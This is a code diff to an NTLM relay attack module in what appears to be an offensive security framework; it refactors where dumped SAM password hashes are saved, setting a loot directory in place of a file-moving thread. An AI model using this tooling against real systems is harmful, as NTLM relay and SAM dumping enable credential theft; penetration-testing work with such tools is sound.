@@ -16,7 +16,6 @@ import os
 import signal
 import shutil
 from requests import get, RequestException
-from tabulate import tabulate
 from rich.console import Console
 from rich.table import Table
 from log_symbols import LogSymbols
@@ -88,22 +87,6 @@ class NtlmRelay(CommandSet):
             self.__display_sam_alert()
             self.__display_connection_alert()
 
-    def __checking_directory_options(self) -> None:
-        """Method that will check the options of the output.
-
-        Args:
-            args (argparse.Namespace): Arguments passed to the attack.
-        """
-        if not self.__check_directory():
-            self._cmd.error_logger.warning(
-                "The specified directory does not exists or you don't have access"
-            )
-            return
-
-        move_sam_result = Thread(target=self.__store_sam_results_of_target)
-        move_sam_result.daemon = True
-        move_sam_result.start()
-
     def __checking_asynchronous_options(self, args: argparse.Namespace) -> None:
         """Method that will check the options of the asynchronous attack.
 
@@ -133,7 +116,12 @@ class NtlmRelay(CommandSet):
         Args:
             args (argparse.Namespace): Arguments passed to the attack.
         """
-        self.__checking_directory_options()
+        if not self.__check_directory():
+            self._cmd.error_logger.warning(
+                "The specified directory does not exists or you don't have access"
+            )
+            return
+
         self.__checking_asynchronous_options(args)
         self.__checking_proxy_options(args)
 
@@ -175,20 +163,11 @@ class NtlmRelay(CommandSet):
         else:
             self.__config.setInterfaceIp(self._cmd.LHOST)
         self.__config.setMode("RELAY")
+        self.__config.setLootdir(args.output_sam)
         self.__config.setTargets(target)
         self.__config.setAttacks(self.__attacks)
         self.__config.setProtocolClients(self.__clients)
         self.__config.setSMB2Support(True)
-
-    def __store_sam_results_of_target(self) -> None:
-        """Method to save the attack output to a file."""
-        current_dir = os.getcwd()
-        while True:
-            with contextlib.suppress(FileNotFoundError):
-                shutil.move(
-                    f"{current_dir}/{self.__output_sam_file}",
-                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
-                )
 
     def __file_exits(self) -> bool:
         """Method to check if a file exists to check its overwriting."""
@@ -392,7 +371,7 @@ class NtlmRelay(CommandSet):
         "--output_sam",
         action="store",
         default="/home/igris/loot",
-        help="Output from the sam hashes",
+        help="Directory to save the SAM",
     )
     attack_options.add_argument(
         "-E",
